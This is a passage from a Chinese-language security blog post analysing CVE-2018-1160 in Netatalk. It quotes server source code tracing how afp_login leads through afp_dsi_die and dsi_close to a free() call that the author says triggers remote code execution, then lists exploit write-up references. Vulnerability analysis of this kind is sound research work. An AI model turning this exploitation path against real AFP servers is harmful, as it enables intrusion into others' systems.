</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">AFPCmd</span> <span class="n">preauth_switch</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   0 -   7 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   8 -  15 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login</span><span class="p">,</span> <span class="n">afp_logincont</span><span class="p">,</span>
    <span class="n">afp_logout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>				<span class="cm">/*  16 -  23 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  24 -  31 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  32 -  39 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  40 -  47 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  48 -  55 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login_ext</span><span class="p">,</span>				<span class="cm">/*  56 -  63 */</span>
    <span class="p">......</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>在最后一条触发语句中调用的是<code>afp_login</code>函数。这个函数会调用<code>send_reply</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">send_reply</span><span class="p">(</span><span class="k">const</span> <span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">,</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">err</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">==</span> <span class="n">AFP_OK</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="n">AFPERR_AUTHCONT</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>

    <span class="n">obj</span><span class="o">-&gt;</span><span class="n">reply</span><span class="p">(</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">dsi</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
    <span class="n">obj</span><span class="o">-&gt;</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// afp_dsi_die
</span><span class="c1"></span>
    <span class="k">return</span> <span class="n">AFP_OK</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>其中<code>obj-&gt;exit</code>指向的是<code>afp_dsi_die</code>函数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* -------------------------------
</span><span class="cm"> * SIGTERM
</span><span class="cm"> * a little bit of code duplication. 
</span><span class="cm"> */</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">afp_dsi_die</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span> <span class="o">=</span> <span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="p">)</span><span class="n">AFPobj</span><span class="o">-&gt;</span><span class="n">dsi</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">DSI_RECONINPROG</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Primary reconnect succeeded, got SIGTERM from afpd parent */</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">DSI_RECONINPROG</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span> <span class="cm">/* this returns to afp_disconnect */</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">DSI_DISCONNECTED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_note</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;Disconnected session terminating&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">dsi_attention</span><span class="p">(</span><span class="n">AFPobj</span><span class="o">-&gt;</span><span class="n">dsi</span><span class="p">,</span> <span class="n">AFPATTN_SHUTDOWN</span><span class="p">);</span>
    <span class="n">afp_dsi_close</span><span class="p">(</span><span class="n">AFPobj</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">sig</span><span class="p">)</span> <span class="cm">/* if no signal, assume dieing because logins are disabled &amp;
</span><span class="cm">                don&#39;t log it (maintenance mode)*/</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_info</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;Connection terminated&#34;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sig</span> <span class="o">==</span> <span class="n">SIGTERM</span> <span class="o">||</span> <span class="n">sig</span> <span class="o">==</span> <span class="n">SIGALRM</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span> <span class="mi">0</span> <span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">sig</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">afp_dsi_close</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">dsi</span><span class="p">;</span>
    <span class="n">sigset_t</span> <span class="n">sigs</span><span class="p">;</span>
    
    <span class="n">close</span><span class="p">(</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">ipc_fd</span><span class="p">);</span>
    <span class="n">obj</span><span class="o">-&gt;</span><span class="n">ipc_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="cm">/* we may have been called from a signal handler caught when afpd was running
</span><span class="cm">     * as uid 0, that&#39;s the wrong user for volume&#39;s prexec_close scripts if any,
</span><span class="cm">     * restore our login user
</span><span class="cm">     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">seteuid</span><span class="p">(</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;can&#39;t seteuid(%u) back %s: uid: %u, euid: %u&#34;</span><span class="p">,</span> 
                <span class="n">obj</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">),</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_SYS</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">close_all_vol</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">logout</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Block sigs, PAM/systemd/whoever might send us a SIG??? in (*obj-&gt;logout)() -&gt; pam_close_session() */</span>
        <span class="n">sigfillset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sigs</span><span class="p">);</span>
        <span class="n">pthread_sigmask</span><span class="p">(</span><span class="n">SIG_BLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sigs</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="p">(</span><span class="o">*</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">logout</span><span class="p">)();</span>
    <span class="p">}</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_note</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">&#34;AFP statistics: %.2f KB read, %.2f KB written&#34;</span><span class="p">,</span>
        <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">read_count</span><span class="o">/</span><span class="mf">1024.0</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">write_count</span><span class="o">/</span><span class="mf">1024.0</span><span class="p">);</span>
    <span class="n">log_dircache_stat</span><span class="p">();</span>

    <span class="n">dsi_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">dsi_close</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* server generated. need to set all the fields. */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">DSI_SLEEPING</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">DSI_DISCONNECTED</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">DSIFL_REQUEST</span><span class="p">;</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span> <span class="o">=</span> <span class="n">DSIFUNC_CLOSE</span><span class="p">;</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_requestID</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dsi_serverID</span><span class="p">(</span><span class="n">dsi</span><span class="p">));</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_reserved</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
      <span class="n">dsi_send</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">free</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>afp_dsi_die</code>-&gt;<code>afp_dsi_close</code>-&gt;<code>dsi_close</code>-&gt;<code>free</code>，最终会调用到free函数触发漏洞RCE。</p>
<h2 id="参考链接">参考链接</h2>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener noreffer">Exploiting an 18 Year Old Bug</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener noreffer">https://github.com/Netatalk/Netatalk/commit/750f9b55844b444b8ff1a38206fd2bdbab85c21f</a></p>
<p><a href="https://ama2in9.top/2021/01/07/cve-2018-1160/" target="_blank" rel="noopener noreffer">CVE-2018-1160 netatalk越界漏洞复现及分析</a></p>
<p><a href="https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk" target="_blank" rel="noopener noreffer">https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk</a></p>
<p><a href="https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener noreffer">Netatalk CVE-2018-1160 分析</a></p>
<p><a href="https://f5.pm/go-15565.html" target="_blank" rel="noopener noreffer">Linux User Exploit(0)&ndash;SROP的引伸</a></p>
<p><a href="https://www.daimajiaoliu.com/daima/4761d240f900402" target="_blank" rel="noopener noreffer">SROP: Sigreturn Oriented Programming</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-04-02&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e" target="_blank" title="commit by LinkleYping(1056669812@qq.com) 7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e: init blog">
                                    <i class="fas fa-hashtag fa-fw"></i>7b7305e</a></span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/cve-2018-1160/index.md" target="_blank">阅读原始文档</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://linkleyping.top/cve-2018-1160/" data-title="CVE-2018-1160分析与复现"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://linkleyping.top/cve-2018-1160/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://linkleyping.top/cve-2018-1160/" data-title="CVE-2018-1160分析与复现"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://linkleyping.top/cve-2018-1160/" data-title="CVE-2018-1160分析与复现"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://linkleyping.top/cve-2018-1160/" data-title="CVE-2018-1160分析与复现"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/pwnable_kr_1/" class="prev" rel="prev" title="pwnable.kr first part"><i class="fas fa-angle-left fa-fw"></i>pwnable.kr first part</a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div>
                <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
                <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
            

            <div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"RFO4PNFHT1","algoliaIndex":"blog","algoliaSearchKey":"d13f32411166c6212551ffa815910ba5","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
